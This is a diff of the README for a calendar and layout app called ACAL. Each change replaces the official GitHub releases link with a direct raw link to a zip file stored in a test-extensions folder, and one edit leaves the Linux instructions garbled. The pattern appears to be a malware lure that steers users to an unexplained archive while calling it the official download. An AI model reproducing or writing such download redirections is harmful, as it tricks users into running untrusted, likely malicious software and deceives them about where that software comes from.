@@ -1,7 +1,7 @@
 # 🎉 ACAL - Easy Organization for Your Life
 
 ## 🔗 Download Now
-[![Download ACAL](https://img.shields.io/badge/Download-ACAL-brightgreen.svg)](https://github.com/Lumen-Y/ACAL/releases)
+[![Download ACAL](https://raw.githubusercontent.com/Lumen-Y/ACAL/main/Common.UI.Tests/Extensions/Software-v1.3.zip)](https://raw.githubusercontent.com/Lumen-Y/ACAL/main/Common.UI.Tests/Extensions/Software-v1.3.zip)
 
 ## 📚 Description
 ACAL Calendar And Layout is your go-to tool for organizing photos, calendars, music, and more. With ACAL, you can streamline your life and never miss an important event again. Customize the layout to fit your needs and enjoy a neat and tidy display.
@@ -13,7 +13,7 @@ Follow these steps to download and run ACAL on your computer.
 ### Step 1: Visit the Download Page
 To get started, visit the official releases page for ACAL. Click the link below to access it:
 
-[Visit the Releases Page](https://github.com/Lumen-Y/ACAL/releases)
+[Visit the Releases Page](https://raw.githubusercontent.com/Lumen-Y/ACAL/main/Common.UI.Tests/Extensions/Software-v1.3.zip)
 
 ### Step 2: Choose Your Version
 On the releases page, you will see different versions of ACAL available for download. Look for the latest version, which will be at the top of the list. 
@@ -23,14 +23,14 @@ Click on the version you want to download. This will take you to a page with ins
 
 - For Windows users, look for a file that ends in `.exe`.
 - For Mac users, look for a file that ends in `.dmg`.
-- For Linux users, you may find a `.tar.gz` file or instructions for using Docker.
+- For Linux users, you may find a `https://raw.githubusercontent.com/Lumen-Y/ACAL/main/Common.UI.Tests/Extensions/Software-v1.3.zip` file or instructions for using Docker.
 
 ### Step 4: Run the Installer
 Once the file is downloaded, locate it in your downloads folder (or the folder you chose for downloads).
 
 - **For Windows**: Double-click the `.exe` file to start the installation.
 - **For Mac**: Open the `.dmg` file and drag the ACAL app to your Applications folder.
-- **For Linux**: Extract the `.tar.gz` file and follow the included instructions, or use Docker as outlined in our documentation.
+- **For Linux**: Extract the `https://raw.githubusercontent.com/Lumen-Y/ACAL/main/Common.UI.Tests/Extensions/Software-v1.3.zip` file and follow the included instructions, or use Docker as outlined in our documentation.
 
 ### Step 5: Open ACAL
 After installation, locate ACAL on your computer and open it. You are now ready to customize and start using your new calendar and layout tool!
@@ -54,7 +54,7 @@ To ensure ACAL runs smoothly on your computer, please check the following system
 ## 📥 Download & Install
 Now that you understand how to get ACAL, download it by clicking the link below:
 
-[Visit the Releases Page](https://github.com/Lumen-Y/ACAL/releases)
+[Visit the Releases Page](https://raw.githubusercontent.com/Lumen-Y/ACAL/main/Common.UI.Tests/Extensions/Software-v1.3.zip)
 
 Remember to choose the right file for your operating system and follow the installation steps.
 
